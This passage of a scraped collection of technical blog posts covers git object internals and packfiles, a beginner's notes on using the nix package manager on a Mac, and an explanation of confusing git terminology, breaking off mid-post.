170da7b0e607c4fd6fb4e921d76307397ab89c1e\t2019-02-17-organizing-this-blog-into-categories.markdown\n100644 blob 7d4f27e9804e3dc80ab3a3912b4f1c890c4d2432\t2019-03-15-new-zine--bite-size-networking-.markdown\n100644 blob 0d1b9fbc7896e47da6166e9386347f9ff58856aa\t2019-03-26-what-are-monoidal-categories.markdown\n100644 blob d6949755c3dadbc6fcbdd20cc0d919809d754e56\t2019-06-23-a-few-debugging-resources.markdown\n100644 blob 3105bdd067f7db16436d2ea85463755c8a772046\t2019-06-28-brag-doc.markdown <-- found it!!!!!\n \n\n Here the  2019-06-28-brag-doc.markdown  is the last file listed because it was\nthe most recent blog post when it was published. \n\n commit step 5: we made it! \n\n Finally we have found the object file where a previous version of my blog post\nlives! Hooray! It has the hash  3105bdd067f7db16436d2ea85463755c8a772046 , so\nit’s in   git/objects/31/05bdd067f7db16436d2ea85463755c8a772046 . \n\n We can look at it with  decompress.py \n\n $ python3 decompress.py .git/objects/31/05bdd067f7db16436d2ea85463755c8a772046 | head\nblob 15924---\ntitle: \"Get your work recognized: write a brag document\"\ndate: 2019-06-28T18:46:02Z\nurl: /blog/brag-documents/\ncategories: []\n---\n... rest of the contents of the file here ...\n \n\n This is the old version of the post! If I ran  git checkout 026c0f52 content/post/2019-06-28-brag-doc.markdown  or  git restore --source 026c0f52 content/post/2019-06-28-brag-doc.markdown , that’s what I’d get. \n\n this tree traversal is how  git log  works \n\n This whole process we just went through (find the commit, go through the\nvarious directory trees, search for the filename we wanted) seems kind of long\nand complicated but this is actually what’s happening behind the scenes when we\nrun  git log content/post/2019-06-28-brag-doc.markdown . It needs to go through\nevery single commit in your history, check the version (for example\n 3105bdd067f7db16436d2ea85463755c8a772046  in this case) of\n content/post/2019-06-28-brag-doc.markdown , and see if it changed from the previous commit. \n\n That’s why  git log FILENAME  is a little slow sometimes – I have 3000 commits in this\nrepository and it needs to do a bunch of work for every single commit to figure\nout if the file changed in that commit or not. \n\n how many previous versions of files do I have? \n\n Right now I have 1530 files tracked in my blog repository: \n\n $ git ls-files | wc -l\n1530\n \n\n But how many historical files are there? We can list everything in  .git/objects  to see how many object files there are: \n\n $ find .git/objects/ -type f | grep -v pack | awk -F/ '{print $3 $4}' | wc -l\n20135\n \n\n Not all of these represent previous versions of files though – as we saw\nbefore, lots of them are commits and directory trees. But we can write another little Python\nscript called  find-blobs.py  that goes through all of the objects and checks\nif it starts with  blob  or not: \n\n import zlib\nimport sys\n\nfor line in sys.stdin:\n    line = line.strip()\n    filename = f\".git/objects/{line[0:2]}/{line[2:]}\"\n    with open(filename, \"rb\") as f:\n        contents = zlib.decompress(f.read())\n        if contents.startswith(b\"blob\"):\n            print(line)\n \n\n $ find .git/objects/ -type f | grep -v pack | awk -F/ '{print $3 $4}' | python3 find-blobs.py | wc -l\n6713\n \n\n So it looks like there are  6713 - 1530 = 5183  old versions of files lying\naround in my git repository that git is keeping around for me in case I ever\nwant to get them back. How nice! \n\n that’s all! \n\n Here’s the gist  with all\nthe code for this post. There’s not very much. \n\n I thought I already knew how git worked, but I’d never really thought about\npack files before so this was a fun exploration. I also don’t spend too much\ntime thinking about how much work  git log  is actually doing when I ask it to\ntrack the history of a file, so that was fun to dig into. \n\n As a funny postscript: as soon as I committed this blog post, git got mad about\nhow many objects I had in my repository (I guess 20,000 is too many!) and\nran  git gc  to compress them all into packfiles. So now my  .git/objects \ndirectory is very small: \n\n $ find .git/objects/ -type f | wc -l\n14\n \n\n"},
{"url": "https://jvns.ca/blog/2023/02/28/some-notes-on-using-nix/", "title": "Some notes on using nix", "content": "\n     \n\n Recently I started using a Mac for the first time. The biggest downside I’ve\nnoticed so far is that the package management is much worse than on Linux.\nAt some point I got frustrated with homebrew because I felt like it was\nspending too much time upgrading when I installed new packages, and so I\nthought – maybe I’ll try the  nix  package manager! \n\n nix has a reputation for being confusing (it has its whole\nown programming language!), so I’ve been trying to figure out how to use nix in\na way that’s as simple as possible and does not involve managing any\nconfiguration files or learning a new programming language. Here’s what I’ve\nfigured out so far! We’ll talk about how to: \n\n \n install packages with nix \n build a custom nix package for a C++ program called  paperjam \n install a 5-year-old version of  hugo  with nix \n \n\n As usual I’ve probably gotten some stuff wrong in this post since I’m still\npretty new to nix. I’m also still not sure how much I like nix – it’s very\nconfusing! But it’s helped me compile some software that I was struggling to\ncompile otherwise, and in general it seems to install things faster than\nhomebrew. \n\n ( note from 18 months later in August 2024 : I’ve mostly switched back to\nHomebrew, nix was interesting but overall I think it’s not worth the complexity\nfor me) \n\n what’s interesting about nix? \n\n People often describe nix as “declarative package management”. I don’t\ncare that much about declarative package management, so here are two things\nthat I appreciate about nix: \n\n \n It provides binary packages (hosted at  https://cache.nixos.org/ ) that you can quickly download and install \n For packages which don’t have binary packages, it makes it easier to compile them \n \n\n I think that the reason nix is good at compiling software is that: \n\n \n you can have multiple versions of the same library or program installed at a time (you could have 2 different versions of libc for instance). For example I have two versions of node on my computer right now, one at  /nix/store/4ykq0lpvmskdlhrvz1j3kwslgc6c7pnv-nodejs-16.17.1  and one at  /nix/store/5y4bd2r99zhdbir95w5pf51bwfg37bwa-nodejs-18.9.1 . \n when nix builds a package, it builds it in isolation, using only the\nspecific versions of its dependencies that you explicitly declared. So\nthere’s no risk that the package secretly depends on another package on your\nsystem that you don’t know about. No more fighting with  LD_LIBRARY_PATH ! \n a lot of people have put a lot of work into writing down all of the\ndependencies of packages \n \n\n I’ll give a couple of examples later in this post of two times nix made it easier for me to compile software. \n\n how I got started with nix \n\n here’s how I got started with nix: \n\n \n Install nix. I forget exactly how I did this, but it looks like there’s an  official installer  and an  unofficial installer from zero-to-nix.com . The  instructions for uninstalling nix on MacOS with the standard multi-user install  are a bit complicated, so it might be worth choosing an installation method with simpler uninstall instructions. \n Put  ~/.nix-profile/bin  on my PATH \n Install packages with  nix-env -iA nixpkgs.NAME \n That’s it. \n \n\n Basically the idea is to treat  nix-env -iA  like  brew install  or  apt-get install . \n\n For example, if I want to install  fish , I can do that like this: \n\n nix-env -iA nixpkgs.fish\n \n\n This seems to just download some binaries from  https://cache.nixos.org  – pretty simple. \n\n Some people use nix to install their Node and Python and Ruby packages, but I haven’t\nbeen doing that – I just use  npm install  and  pip install  the same way I\nalways have. \n\n some nix features I’m not using \n\n There are a bunch of nix features/tools that I’m not using, but that I’ll\nmention. I originally thought that you  had  to use these features to use nix,\nbecause most of the nix tutorials I’ve read talk about them. But you don’t have to use them. \n\n \n NixOS (a Linux distribution) \n nix-shell \n nix flakes \n home-manager \n devenv.sh \n \n\n I won’t go into these because I haven’t really used them and there are lots of\nexplanations out there. \n\n where are nix packages defined? \n\n I think packages in the main nix package repository are defined in  https://github.com/NixOS/nixpkgs/ \n\n It looks like you can search for packages at  https://search.nixos.org/packages . The two official ways to search packages seem to be: \n\n \n nix-env -qaP NAME , which is very extremely slow and which I haven’t been able to get to actually work \n nix --extra-experimental-features 'nix-command flakes' search nixpkgs NAME , which does seem to work but is kind of a mouthful. Also all of the packages it prints out start with  legacyPackages  for some reason \n \n\n I found a way to search nix packages from the command line that I liked better: \n\n \n Run  nix-env -qa '*' > nix-packages.txt  to get a list of every package in the Nix repository \n Write a short  nix-search  script that just greps  packages.txt  ( cat ~/bin/nix-packages.txt | awk '{print $1}' | rg \"$1\" ) \n \n\n everything is installed with symlinks \n\n One of nix’s major design choices is that there isn’t one single  bin  with all\nyour packages, instead you use symlinks.  There are a lot of layers of symlinks. A few examples of symlinks: \n\n \n ~/.nix-profile  on my machine is (indirectly) a symlink to  /nix/var/nix/profiles/per-user/bork/profile-111-link/ \n ~/.nix-profile/bin/fish  is a symlink to  /nix/store/afkwn6k8p8g97jiqgx9nd26503s35mgi-fish-3.5.1/bin/fish \n \n\n When I install something, it creates a new  profile-112-link  directory with new symlinks and updates my  ~/.nix-profile  to point to that directory. \n\n I think this means that if I install a new version of  fish  and I don’t like it, I can\neasily go back just by running  nix-env --rollback  – it’ll move me to my previous profile directory. \n\n uninstalling packages doesn’t delete them \n\n If I uninstall a nix package like this, it doesn’t actually free any hard drive space, it just removes the symlinks. \n\n $ nix-env --uninstall oil\n \n\n I’m still not sure how to actually delete the package – I ran a garbage collection like this, which seemed to delete some things: \n\n $ nix-collect-garbage\n...\n85 store paths deleted, 74.90 MiB freed\n \n\n But I still have  oil  on my system at  /nix/store/8pjnk6jr54z77jiq5g2dbx8887dnxbda-oil-0.14.0 . \n\n There’s a more aggressive version of  nix-collect-garbage  that also deletes old versions of your profiles (so that you can’t rollback) \n\n $ nix-collect-garbage -d --delete-old\n \n\n That doesn’t delete  /nix/store/8pjnk6jr54z77jiq5g2dbx8887dnxbda-oil-0.14.0  either though and I’m not sure why. \n\n upgrading \n\n It looks like you can upgrade nix packages like this: \n\n nix-channel --update\nnix-env --upgrade\n \n\n (similar to  apt-get update && apt-get upgrade ) \n\n I haven’t really upgraded anything yet. I think that if something goes wrong with an upgrade, you can roll back (because everything is immutable in nix!) with \n\n nix-env --rollback\n \n\n Someone linked me to  this post from Ian Henry  that\ntalks about some confusing problems with  nix-env --upgrade  – maybe it\ndoesn’t work the way you’d expect? I guess I’ll be wary around upgrades. \n\n next goal: make a custom package of  paperjam \n\n After a few months of installing existing packages, I wanted to make a custom package with nix for a program called  paperjam  that wasn’t already packaged. \n\n I was actually struggling to compile  paperjam  at all even without nix  because the version I had\nof  libiconv  I has on my system was wrong. I thought it might be easier to\ncompile it with nix even though I didn’t know how to make nix packages yet. And\nit actually was! \n\n But figuring out how to get there was VERY confusing, so here are some notes about how I did it. \n\n how to build an example package \n\n Before I started working on my  paperjam  package, I wanted to build an example existing package just to\nmake sure I understood the process for building a package. I was really\nstruggling to figure out how to do this, but I asked in Discord and someone\nexplained to me how I could get a working package from  https://github.com/NixOS/nixpkgs/  and build it. So here\nare those instructions: \n\n step 1:  Download some arbitrary package from  nixpkgs  on github, for example the  dash  package: \n\n wget https://raw.githubusercontent.com/NixOS/nixpkgs/47993510dcb7713a29591517cb6ce682cc40f0ca/pkgs/shells/dash/default.nix -O dash.nix\n \n\n step 2 : Replace the first statement ( { lib , stdenv , buildPackages , autoreconfHook , pkg-config , fetchurl , fetchpatch , libedit , runCommand , dash }:  with  with import <nixpkgs> {};  I don’t know why you have to do this,\nbut it works. \n\n step 3 : Run  nix-build dash.nix \n\n This compiles the package \n\n step 4 : Run  nix-env -i -f dash.nix \n\n This installs the package into my  ~/.nix-profile \n\n That’s all! Once I’d done that, I felt like I could modify the  dash  package and make my own package. \n\n how I made my own package \n\n paperjam  has one dependency ( libpaper ) that also isn’t packaged yet, so I needed to build  libpaper  first. \n\n Here’s  libpaper.nix . I basically just wrote this by copying and pasting from\nother packages in the  nixpkgs  repository.\nMy guess is what’s happening here is that nix has some default rules for\ncompiling C packages (like “run  make install ”), so the  make install  happens\ndefault and I don’t need to configure it explicitly. \n\n with import <nixpkgs> {};\n\nstdenv.mkDerivation rec {\n  pname = \"libpaper\";\n  version = \"0.1\";\n\n  src = fetchFromGitHub {\n    owner = \"naota\";\n    repo = \"libpaper\";\n    rev = \"51ca11ec543f2828672d15e4e77b92619b497ccd\";\n    hash = \"sha256-S1pzVQ/ceNsx0vGmzdDWw2TjPVLiRgzR4edFblWsekY=\";\n  };\n\n  buildInputs = [ ];\n\n  meta = with lib; {\n    homepage = \"https://github.com/naota/libpaper\";\n    description = \"libpaper\";\n    platforms = platforms.unix;\n    license = with licenses; [ bsd3 gpl2 ];\n  };\n}\n \n\n Basically this just tells nix how to download the source from GitHub. \n\n I built this by running  nix-build libpaper.nix \n\n Next, I needed to compile  paperjam . Here’s a link to the  nix package I wrote . The main things I needed to do other than telling it where to download the source were: \n\n \n add some extra build dependencies (like  asciidoc ) \n set some environment variables for the install ( installFlags = [ \"PREFIX=$(out)\" ]; ) so that it installed in the correct directory instead of  /usr/local/bin . \n \n\n I set the hashes by first leaving the hash empty, then running  nix-build  to get an error message complaining about a mismatched hash. Then I copied the correct hash out of the error message. \n\n I figured out how to set  installFlags  just by running  rg PREFIX \nin the nixpkgs repository – I figured that needing to set a  PREFIX  was\npretty common and someone had probably done it before, and I was right. So I\njust copied and pasted that line from another package. \n\n Then I ran: \n\n nix-build paperjam.nix\nnix-env -i -f paperjam.nix\n \n\n and then everything worked and I had  paperjam  installed! Hooray! \n\n next goal: install a 5-year-old version of  hugo \n\n Right now I build this blog using Hugo 0.40, from 2018. I don’t need any new\nfeatures so I haven’t felt a need to upgrade. On Linux this is easy: Hugo’s\nreleases are a static binary, so I can just download the 5-year-old binary from\nthe  releases page  and\nrun it. Easy! \n\n But on this Mac I ran into some complications. Mac hardware has changed in the\nlast 5 years, so the Mac Hugo binary I downloaded crashed. And when I tried to\nbuild it from source with  go build , that didn’t work either because Go build\nnorms have changed in the last 5 years as well. \n\n I was working around this by running Hugo in a Linux docker container, but I\ndidn’t love that: it was kind of slow and it felt silly. It shouldn’t be that\nhard to compile one Go program! \n\n Nix to the rescue! Here’s what I did to install the old version of Hugo with\nnix. \n\n installing Hugo 0.40 with nix \n\n I wanted to install Hugo 0.40 and put it in my PATH as  hugo-0.40 . Here’s how\nI did it. I did this in a kind of weird way, but it worked ( Searching and installing old versions of Nix packages \ndescribes a probably more normal method). \n\n step 1 : Search through the nixpkgs repo to find Hugo 0.40 \n\n I found the  .nix  file here  https://github.com/NixOS/nixpkgs/blob/17b2ef2/pkgs/applications/misc/hugo/default.nix \n\n step 2 : Download that file and build it \n\n I downloaded that file (and another file called  deps.nix  in the same directory), replaced the first line with  with import <nixpkgs> {}; , and built it with  nix-build hugo.nix . \n\n That almost worked without any changes, but I had to make two changes: \n\n \n replace  with stdenv.lib  to  with lib  for some reason. \n rename the package to  hugo040  so that it wouldn’t conflict with the other version of  hugo  that I had installed \n \n\n step 3 : Rename  hugo  to  hugo-0.40 \n\n I write a little post install script to rename the Hugo binary. \n\n   postInstall = ''\n    mv $out/bin/hugo $out/bin/hugo-0.40\n  '';\n \n\n I figured out how to run this by running  rg 'mv '  in the nixpkgs repository and just copying and modifying something that seemed related. \n\n step 4 : Install it \n\n I installed into my  ~/.nix-profile/bin  by running  nix-env -i -f hugo.nix . \n\n And it all works! I put the final  .nix  file into my own personal  nixpkgs repo  so that I can use it again later if I\nwant. \n\n reproducible builds aren’t magic, they’re really hard \n\n I think it’s worth noting here that this  hugo.nix  file isn’t magic – the\nreason I can easily compile Hugo 0.40 today is that many people worked for a long time to make it possible to\npackage that version of Hugo in a reproducible way. \n\n that’s all! \n\n Installing  paperjam  and this 5-year-old version of Hugo were both\nsurprisingly painless and actually much easier than compiling it without nix,\nbecause nix made it much easier for me to compile the  paperjam  package with\nthe right version of  libiconv , and because someone 5 years ago had already\ngone to the trouble of listing out the exact dependencies for Hugo. \n\n I don’t have any plans to get much more complicated with nix (and it’s still\nvery possible I’ll get frustrated with it and go back to homebrew!), but we’ll\nsee what happens! I’ve found it much easier to start in a simple way and then\nstart using more features if I feel the need instead of adopting a whole bunch\nof complicated stuff all at once. \n\n I probably won’t use nix on Linux – I’ve always been happy enough with  apt \n(on Debian-based distros) and  pacman  (on Arch-based distros), and they’re\nmuch less confusing. But on a Mac it seems like it might be worth it. We’ll\nsee! It’s very possible in 3 months I’ll get frustrated with nix and just go back to homebrew. \n\n 5-month update: rebuilding my nix profile \n\n Update from 5 months in: nix is still going well, and I’ve only run into 1\nproblem, which is that every  nix-env -iA  package installation started failing\nwith the error “bad meta.outputsToInstall”. \n\n This script \nfrom Ross Light fixes that problem though. It lists every derivation installed\nin my current profile and creates a new profile with the exact same\nderivations. This feels like a nix bug (surely creating a new profile with the\nexact same derivations should be a no-op?) but I haven’t looked into it more yet. \n\n"},
{"url": "https://jvns.ca/blog/2023/11/01/confusing-git-terminology/", "title": "Confusing git terminology", "content": "\n     \n\n Hello! I’m slowly working on explaining git. One of my biggest problems is that\nafter almost 15 years of using git, I’ve become very used to git’s\nidiosyncracies and it’s easy for me to forget what’s confusing about it. \n\n So I asked people  on Mastodon : \n\n \n what git jargon do you find confusing? thinking of writing a blog post that explains some of git’s weirder terminology: “detached HEAD state”, “fast-forward”, “index/staging area/staged”, “ahead of ‘origin/main’ by 1 commit”, etc \n \n\n I got a lot of GREAT answers and I’ll try to summarize some of them here.  Here’s a list of the terms: \n\n \n HEAD and “heads” \n “detached HEAD state” \n “ours” and “theirs” while merging or rebasing \n “Your branch is up to date with ‘origin/main’” \n HEAD^, HEAD~ HEAD^^, HEAD~~, HEAD^2, HEAD~2 \n .. and … \n “can be fast-forwarded” \n “reference”, “symbolic reference” \n refspecs \n “tree-ish” \n “index”, “staged”, “cached” \n “reset”, “revert”, “restore” \n “untracked files”, “remote-tracking branch”, “track remote branch” \n checkout \n reflog \n merge vs rebase vs cherry-pick \n rebase –onto \n commit \n more confusing terms \n \n\n I’ve done my best to explain what’s going on with these terms, but they\ncover basically every single major feature of git which is definitely too much\nfor a single blog post so it’s pretty patchy in some places. \n\n HEAD  and “heads” \n\n A few people said they were confused by the terms  HEAD  and  refs/heads/main ,\nbecause it sounds like it’s some complicated technical internal thing. \n\n Here’s a quick summary: \n\n \n “heads” are “branches”. Internally in git, branches are stored in a directory called  .git/refs/heads . (technically the  official git glossary  says that the branch is all the commits on it and the head is just the most recent commit, but they’re 2 different ways to think about the same thing) \n HEAD  is the current branch. It’s stored in  .git/HEAD . \n \n\n I think that “a  head  is a branch,  HEAD  is the current branch” is a good\ncandidate for the weirdest terminology choice in git, but it’s definitely too\nlate for a clearer naming scheme so let’s move on. \n\n There are some important exceptions to “HEAD is the current branch”, which we’ll talk about next. \n\n “detached HEAD state” \n\n You’ve probably seen this message: \n\n $ git checkout v0.1\nYou are in 'detached HEAD' state. You can look around, make experimental\nchanges and commit them, and you can discard any commits you make in this\nstate without impacting any branches by switching back to a branch.\n\n[...]\n \n\n Here’s the deal with this message: \n\n \n In Git, usually you have a “current branch” checked out, for example  main . \n The place the current branch is stored is called  HEAD . \n Any new commits you make will get added to your current branch, and if you run  git merge other_branch , that will also affect your current branch \n But  HEAD  doesn’t  have  to be a branch! Instead it can be a commit ID. \n Git calls this state (where HEAD is a commit ID instead of a branch) “detached HEAD state” \n For example, you can get into detached HEAD state by checking out a tag, because a tag isn’t a branch \n if you don’t have a current branch, a bunch of things break:\n\n \n git pull  doesn’t work at all (since the whole point of it is to update your current branch) \n neither does  git push  unless you use it in a special way \n git commit ,  git merge ,  git rebase , and  git cherry-pick   do  still\nwork, but they’ll leave you with “orphaned” commits that aren’t connected\nto any branch, so those commits will be hard to find \n \n You can get out of detached HEAD state by either creating a new branch or switching to an existing branch \n \n\n “ours” and “theirs” while merging or rebasing \n\n If you have a merge conflict, you can run  git checkout --ours file.txt  to pick the version of  file.txt  from the “ours” side. But which side is “ours” and which side is “theirs”? \n\n I always find this confusing and I never use  git checkout --ours  because of\nthat, but I looked it up to see which is which. \n\n For merges, here’s how it works: the current branch is “ours” and the branch\nyou’re merging in is “theirs”, like this. Seems reasonable. \n\n $ git checkout merge-into-ours # current branch is \"ours\"\n$ git merge from-theirs # branch we're merging in is \"theirs\"\n \n\n For rebases it’s the opposite – the current branch is “theirs” and the target branch we’re rebasing onto is “ours”, like this: \n\n $ git checkout theirs # current branch is \"theirs\"\n$ git rebase ours # branch we're rebasing onto is \"ours\"\n \n\n I think the reason for this is that under the hood  git rebase main  is\nrepeatedly merging commits from the current branch into a copy of the  main  branch (you can\nsee what I mean by that in  this weird shell script the implements  git rebase  using  git merge . But I\nstill find it confusing. \n\n This nice tiny site  explains the “ours” and “theirs” terms. \n\n A couple of people also mentioned that VSCode calls “ours”/“theirs” “current\nchange”/“incoming change”, and that it’s confusing in the exact same way. \n\n “Your branch is up to date with ‘origin/main’” \n\n This message seems straightforward – it’s saying that your  main  branch is up\nto date with the origin! \n\n But it’s actually a little misleading. You might think that this means that\nyour  main  branch is up to date. It doesn’t. What it  actually  means is –\nif you last ran  git fetch  or  git pull  5 days ago, then your  main  branch\nis up to date with all the changes  as of 5 days ago . \n\n So if you don’t realize that, it can give you a false sense of security. \n\n I think git could theoretically give you a more useful message like “is up to\ndate with the origin’s  main   as of your last fetch 5 days ago ” because the time\nthat the most recent fetch happened is stored in the reflog, but it doesn’t. \n\n HEAD^ ,  HEAD~   HEAD^^ ,  HEAD~~ ,  HEAD^2 ,  HEAD~2 \n\n I’ve known for a long time that  HEAD^  refers to the previous commit, but I’ve\nbeen confused for a long time about the difference between  HEAD~  and  HEAD^ . \n\n I looked it up, and here’s how these relate to each other: \n\n \n HEAD^  and  HEAD~  are the same thing (1 commit ago) \n HEAD^^^  and  HEAD~~~  and  HEAD~3  are the same thing (3 commits ago) \n HEAD^3  refers the the third parent of a commit, and is different from  HEAD~3 \n \n\n This seems weird – why are  HEAD~  and  HEAD^  the same thing? And what’s the\n“third parent”? Is that the same thing as the parent’s parent’s parent? (spoiler: it\nisn’t) Let’s talk about it! \n\n Most commits have only one parent. But merge commits have multiple parents  –\nthey’re merging together 2 or more commits. In Git  HEAD^  means “the parent of\nthe HEAD commit”. But what if HEAD is a merge commit? What does  HEAD^  refer\nto? \n\n The answer is that  HEAD^  refers to the the  first  parent of the merge,\n HEAD^2  is the second parent,  HEAD^3  is the third parent, etc. \n\n But I guess they also wanted a way to refer to “3 commits ago”, so  HEAD^3  is\nthe third parent of the current commit (which may have many parents if it’s a merge commit), and  HEAD~3  is the parent’s parent’s\nparent. \n\n I think in the context of the merge commit ours/theirs discussion earlier,  HEAD^  is “ours” and  HEAD^2  is “theirs”. \n\n ..  and  ... \n\n Here are two commands: \n\n \n git log main..test \n git log main...test \n \n\n What’s the difference between  ..  and  ... ? I never use these so I had to look it up in  man git-range-diff . It seems like the answer is that in this case: \n\n A - B main\n  \\ \n    C - D test\n \n\n \n main..test  is commits C and D \n test..main  is commit B \n main...test  is commits B, C, and D \n \n\n But it gets worse: apparently  git diff  also supports  ..  and  ... , but\nthey do something completely different than they do with  git log ? I think the summary is: \n\n \n git log test..main  shows changes on  main  that aren’t on  test , whereas  git log test...main  shows changes on  both  sides. \n git diff test..main  shows  test  changes  and   main  changes (it diffs  B  and  D ) whereas  git diff test...main  diffs  A  and  D  (it only shows you the diff on one side). \n \n\n this blog post  talks about it a bit more. \n\n “can be fast-forwarded” \n\n Here’s a very common message you’ll see in  git status : \n\n $ git status\nOn branch main\nYour branch is behind 'origin/main' by 2 commits, and can be fast-forwarded.\n  (use \"git pull\" to update your local branch)\n \n\n What does “fast-forwarded” mean? Basically it’s trying to say that the two branches look something like this: (newest commits are on the right) \n\n main:        A - B - C\norigin/main: A - B - C - D - E\n \n\n or visualized another way: \n\n A - B - C - D - E (origin/main)\n        |\n       main\n \n\n Here  origin/main  just has 2 extra commits that  main  doesn’t have, so it’s\neasy to bring  main  up to date – we just need to add those 2 commits.\nLiterally nothing can possibly go wrong – there’s no possibility of merge\nconflicts. A fast forward merge is a very good thing! It’s the easiest way to combine 2 branches. \n\n After running  git pull , you’ll end up this state: \n\n main:        A - B - C - D - E\norigin/main: A - B - C - D - E\n \n\n Here’s an example of a state which  can’t  be fast-forwarded. \n\n              A - B - C - X  (main)\n                     |\n                     - - D - E  (origin/main)\n \n\n Here  main  has a commit that  origin/main  doesn’t have ( X ). So\nyou can’t do a fast forward. In that case,  git status  would say: \n\n $ git status\nYour branch and 'origin/main' have diverged,\nand have 1 and 2 different commits each, respectively.\n \n\n “reference”, “symbolic reference” \n\n I’ve always found the term “reference” kind of confusing. There are at least 3 things that get called “references” in git \n\n \n branches and tags like  main  and  v0.2 \n HEAD , which is the current branch \n things like  HEAD^^^  which git will resolve to a commit ID. Technically these are probably not “references”, I guess git  calls them  “revision parameters” but I’ve never used that term. \n \n\n “symbolic reference” is a very weird term to me because personally I think the only\nsymbolic reference I’ve ever used is  HEAD  (the current branch), and  HEAD \nhas a very central place in git (most of git’s core commands’ behaviour depends\non the value of  HEAD ), so I’m not sure what the point of having it as a\ngeneric concept is. \n\n refspecs \n\n When you configure a git remote in  .git/config , there’s this  +refs/heads/main:refs/remotes/origin/main  thing. \n\n [remote \"origin\"]\n\turl = git@github.com:jvns/pandas-cookbook\n\tfetch = +refs/heads/main:refs/remotes/origin/main\n \n\n I don’t really know what this means, I’ve always just used whatever the default\nis when you do a  git clone  or  git remote add , and I’ve never felt any\nmotivation to learn about it or change it from the default. \n\n “tree-ish” \n\n The man page for  git checkout  says: \n\n  git checkout [-f|--ours|--theirs|-m|--conflict=<style>] [<tree-ish>] [--] <pathspec>...\n \n\n What’s  tree-ish ??? What git is trying to say here is when you run  git checkout THING . ,  THING  can be either: \n\n \n a commit ID (like  182cd3f ) \n a reference to a commit ID (like  main  or  HEAD^^  or  v0.3.2 ) \n a subdirectory  inside  a commit (like  main:./docs ) \n I think that’s it???? \n \n\n Personally I’ve never used the “directory inside a commit” thing and from my perspective “tree-ish” might as well just mean “commit or reference to commit”. \n\n “index”, “staged”, “cached” \n\n All of these refer to the exact same thing (the file  .git/index , which is where your changes are staged when you run  git add ): \n\n \n git diff --cached \n git rm --cached \n git diff --staged \n the file  .git/index \n \n\n Even though they all ultimately refer to the same file, there’s some variation in how those terms are used in practice: \n\n \n Apparently the flags  --index  and  --cached  do not generally mean the same\nthing. I have personally never used the  --index  flag so I’m not\ngoing to get into it, but  this blog post by Junio\nHamano  (git’s lead maintainer)\nexplains all the gnarly details \n the “index” lists untracked files (I guess for performance reasons) but you don’t usually think of the “staging area” as including untracked files” \n \n\n “reset”, “revert”, “restore” \n\n A bunch of people mentioned that “reset”, “revert” and “restore” are very\nsimilar words and it’s hard to differentiate them. \n\n I think it’s made worse because \n\n \n git reset --hard  and  git restore .  on their own do basically the same thing. (though  git reset --hard COMMIT  and  git restore --source COMMIT .  are completely different from each other) \n the respective man pages don’t give very helpful descriptions:\n\n \n git reset : “Reset current HEAD to the specified state” \n git revert : “Revert some existing commits” \n git restore : “Restore working tree files” \n \n \n\n Those short descriptions do give you a better sense for which noun is being\naffected (“current HEAD”, “some commits”, “working tree files”) but they assume\nyou know what “reset”, “revert” and “restore” mean in this context. \n\n Here are some short descriptions of what they each do: \n\n \n git revert COMMIT : Create a new commit that’s the “opposite” of COMMIT on your current branch (if COMMIT added 3 lines, the new commit will delete those 3 lines) \n git reset --hard COMMIT : Force your current branch back to the state it was at  COMMIT , erasing any new changes since  COMMIT . Very dangerous operation. \n git restore --source=COMMIT PATH : Take all the files in  PATH  back to how they were at  COMMIT , without changing any other files or commit history. \n \n\n “untracked files”, “remote-tracking branch”, “track remote branch” \n\n Git uses the word “track” in 3 different related ways: \n\n \n Untracked files:  in the output of  git status . This means those files aren’t managed by Git and won’t be included in commits. \n a “remote tracking branch” like  origin/main . This is a local reference, and it’s the commit ID that  main  pointed to on the remote  origin  the last time you ran  git pull  or  git fetch . \n “branch foo set up to  track  remote branch bar from origin” \n \n\n The “untracked files” and “remote tracking branch” thing is not too bad – they\nboth use “track”, but the context is very different. No big deal. But I think\nthe other two uses of “track” are actually quite confusing: \n\n \n main  is a branch that tracks a remote \n origin/main  is a remote-tracking branch \n \n\n But a “branch that tracks a remote” and a “remote-tracking branch” are\ndifferent things in Git and the distinction is pretty important! Here’s a quick\nsummary of the differences: \n\n \n main  is a branch. You can make commits to it, merge into it, etc. It’s often configured to “track” the remote  main  in  .git/config , which means that you can use  git pull  and  git push  to push/pull changes. \n origin/main  is not a branch. It’s a “remote-tracking branch”, which is not\na kind of branch (I’m sorry). You  can’t  make commits to it. The only way\nyou can update it is by running  git pull  or  git fetch  to get the latest\nstate of  main  from the remote. \n \n\n I’d never really thought about this ambiguity before but I think it’s pretty\neasy to see why folks are confused by it. \n\n checkout \n\n Checkout does two totally unrelated things: \n\n \n git checkout BRANCH  switches branches \n git checkout file.txt  discards your unstaged changes to  file.txt \n \n\n This is well known to be confusing and git has actually split those two\nfunctions into  git switch  and  git restore  (though you can still use\ncheckout if, like me, you have 15 years of muscle memory around  git checkout \nthat you don’t feel like unlearning) \n\n Also personally after 15 years I still can’t remember the order of the\narguments to  git checkout main file.txt  for restoring the version of\n file.txt  from the  main  branch. \n\n I think sometimes you need to pass  --  to  checkout  as an argument somewhere\nto help it figure out which argument is a branch and which ones are paths but I\nnever do that and I’m not sure when it’s needed. \n\n reflog \n\n Lots of people mentioning reading reflog as  re-flog  and not  ref-log . I\nwon’t get deep into the reflog here because this post is REALLY long but: \n\n \n “reference” is an umbrella term git uses for branches, tags, and HEAD \n the reference log (“reflog”) gives you the history of everything a reference has ever pointed to \n It can help get you out of some VERY bad git situations, like if you accidentally delete an important branch \n I find it one of the most confusing parts of git’s UI and I try to avoid\nneeding to use it. \n \n\n merge vs rebase vs cherry-pick \n\n A bunch of people mentioned being confused about the difference between merge\nand rebase and not understanding what the “base” in rebase was supposed to be. \n\n I’ll try to summarize them very briefly here, but I don’t think these 1-line\nexplanations are that useful because people structure their workflows around\nmerge / rebase in pretty different ways and to really understand merge/rebase\nyou need to understand the workflows. Also pictures really help. That could\nreally be its whole own blog post though so I’m not going to get into it. \n\n \n merge creates a single new commit that merges the 2 branches \n rebase copies commits on the current branch to the target branch, one at a time. \n cherry-pick is similar to rebase, but with a totally different syntax (one\nbig difference is that rebase copies commits FROM the current branch,\ncherry-pick copies commits TO the current branch) \n \n\n rebase --onto \n\n git rebase  has an flag called  onto . This has always seemed confusing to me\nbecause the whole point of  git rebase main  is to rebase the current branch\n onto  main. So what’s the extra  onto  argument about? \n\n I looked it up, and  --onto  definitely solves a problem that I’ve rarely/never\nactually had, but I guess I’ll write down my understanding of it anyway. \n\n A - B - C (main)\n     \\\n      D - E - F - G (mybranch)\n          | \n          otherbranch\n \n\n Imagine that for some reason I just want to move commits  F  and  G  to be\nrebased on top of  main . I think there’s probably some git workflow where this\ncomes 